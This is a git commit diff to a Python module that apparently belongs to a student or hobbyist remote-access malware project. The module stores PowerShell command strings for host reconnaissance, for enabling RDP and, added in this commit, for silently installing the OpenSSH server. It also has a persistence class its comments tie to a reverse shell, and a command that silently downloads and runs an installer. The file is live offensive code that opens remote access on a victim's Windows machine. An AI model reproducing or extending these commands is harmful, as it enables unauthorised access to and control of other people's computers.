dd9f85af77b5ee1b7b4f351fa979b4a047ef719f
m0nsieurPsych0 <thevilpsycho666@protonmail.com>
2021-05-29 16:52:51 -0400

    Ajout d'une commande pour installer le serveur SSH

--- Projet_BoulaisKarl/Reproduction/powershell.py
+++ Projet_BoulaisKarl/Reproduction/powershell.py
@@ -4,7 +4,6 @@
 __author__ = 'Karl Boulais'
 
 from enum import Enum
-import subprocess
 
 # Global
 psPrefix = "powershell -command "
@@ -14,10 +13,10 @@ class Powershell():
     
     class GetInfo(Enum):
         # Get user data
+        HOSTNAME         = f"{psPrefix}[System.Net.Dns]::GetHostName()"
         LOCALIP          = f"{psPrefix}(Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias 'Ethernet *').IPAddress"
         MAC              = f"{psPrefix}((Out-String -InputObject (Get-NetAdapter -Physical | Format-List -Property MacAddress)).split(':')[1]).Trim()"
         USERS            = f"{psPrefix}(Out-String -InputObject (Get-LocalUser | Where-object {{ $_.Enabled -like 'True' }} | Format-List -Property Name)).Replace('Name : ', '').Split([Environment]::NewLine, [StringSplitOptions]::RemoveEmptyEntries)"
-        HOSTNAME         = f"{psPrefix}[System.Net.Dns]::GetHostName()"
         RUNNINGSERVICES  = f"{psPrefix}Get-Service | Where-Object {{$_.Status -eq 'Running'}} | Format-Table Name, DisplayName"
         ARCH             = f"{psPrefix}(wmic os get osarchitecture)[2]"
         PCINFO           = f"{psPrefix}Get-ComputerInfo"
@@ -34,6 +33,7 @@ class Powershell():
 
     class ActivateServices(Enum):
         ENABLERDP           = f"{psPrefix}Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name 'fDenyTSConnections' -Value 0 && ; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name 'UserAuthentication' -Value 1"    
+        ENABLESSH           = f"{psPrefix}Add-WindowsCapability -Online -Name ((Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Server*').name)"  
 
     # Ajouté un service pour faire persister la connexion reverseShell
     class Persist(Enum):
@@ -45,17 +45,7 @@ class Powershell():
         PYTHON64             = f'{psPrefix}[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64-webinstall.exe" -OutFile "$($Env:TEMP)/python-3.9.5-amd64-webinstall.exe" ; Start-Process -NoNewWindow -Filepath "$($Env:TEMP)/python-3.9.5-amd64-webinstall.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0"'
 
 
-    # TODO: OPTIONNEL
-    # GETADMINPASS = ""
-    # GETPUBLICIP  = ""
-
 if __name__ == "__main__":
-    pass
-    # test = Powershell.GETLOCALIP.value
-    # print(str(test))
-    # print(Powershell.GetInfo.GETARCH.value)
-    # print(subprocess.getoutput(Powershell.Persist.CHECKEVILSTATUS.value))
-    # print(subprocess.check_output(Powershell.Persist.CHECKEVILSTATUS.value))
-    # for command in (Powershell.GetInfo):
-    #     print(command.name)
-    #     print(subprocess.check_call(command.value))
+    for command in (Powershell.GetInfo):
+        print(command.name)
+        print(command.value)
